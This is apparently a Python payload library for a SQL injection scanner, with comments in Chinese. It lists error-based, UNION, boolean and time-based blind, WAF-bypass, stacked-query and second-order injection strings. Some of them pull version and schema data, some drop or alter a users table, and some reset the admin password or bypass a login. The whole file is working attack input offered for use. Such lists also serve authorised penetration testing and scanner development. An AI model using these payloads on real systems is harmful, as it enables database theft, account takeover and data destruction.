"""SQL注入Payload库 - 100+ Payloads"""

SQLI_ERROR = [
    ("'", r"(sql|syntax|mysql|ORA-|PLS-)"),
    ('"', r"(sql|syntax|mysql)"),
    ("\\", r"(sql|syntax)"),
    ("'--", r"(sql|syntax)"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", r"XPATH"),
    ("' AND 1=CONVERT(int,@@version)--", r"convert"),
    ("' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", r"XPATH"),
]

SQLI_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", 
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT @@version,NULL,NULL--",
    "' UNION SELECT user(),NULL,NULL--",
    "' UNION SELECT database(),NULL,NULL--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "-1' UNION SELECT 1,2,3--",
    "1' UNION SELECT ALL 1,2,3--",
]

SQLI_BLIND_BOOL = [
    "' AND '1'='1",
    "' AND '1'='2",
    "' OR '1'='1",
    "' AND 1=1--",
    "' AND 1=0--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
    "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--",
]

SQLI_BLIND_TIME = [
    "' AND SLEEP(3)--",
    "' AND SLEEP(5)--",
    "' AND IF(1=1,SLEEP(3),0)--",
    "' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)--",
    "'; SELECT pg_sleep(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' AND BENCHMARK(5000000,SHA1('test'))--",
    "' OR IF(1=1,SLEEP(3),0)--",
]

SQLI_WAF_BYPASS = [
    # 注释绕过
    "/*!50000' OR '1'='1'*/",
    "' /*!50000OR*/ '1'='1",
    "'+/*!50000UNION*/+/*!50000SELECT*/+1,2,3--",
    "/*!32302 1/0, */1",
    # 大小写
    "' uNiOn SeLeCt 1,2,3--",
    "' UnIoN/**/SeLeCt/**/1,2,3--",
    # 空白符
    "'%09OR%09'1'='1",
    "'%0aOR%0a'1'='1",
    "'%0dOR%0d'1'='1",
    "'%0bOR%0b'1'='1",
    "'+OR+'1'='1",
    "'/**/OR/**/'1'='1",
    # URL编码
    "%27%20OR%20%271%27%3D%271",
    "%2527%2520OR%2520%25271%2527%253D%25271",
    # 十六进制
    "' OR 0x31=0x31--",
    "' OR CHAR(49)=CHAR(49)--",
    # 函数替换
    "' OR CONCAT('1','')='1'--",
    "' AND MID(version(),1,1)='5'--",
    # HPP
    "' OR '1'='1'/*&id=' OR '1'='1",
    # 科学计数法
    "0e1' OR '1'='1",
    # JSON
    "'-JSON_EXTRACT('[1]','$[0]')='1",
]

SQLI_STACKED = [
    "'; SELECT @@version;--",
    "'; SELECT user();--", 
    "'; SELECT SLEEP(3);--",
    "'; DROP TABLE users;--",
    "'; INSERT INTO users VALUES('hacker','hacked');--",
    "'; UPDATE users SET password='hacked' WHERE username='admin';--",
    "'; CREATE TABLE pwned(data VARCHAR(100));--",
]

SQLI_SECOND_ORDER = [
    "admin'--",
    "admin'/*",
    "admin' AND '1'='1",
]

ALL_SQLI = SQLI_UNION + SQLI_BLIND_BOOL + SQLI_BLIND_TIME + SQLI_WAF_BYPASS + SQLI_STACKED
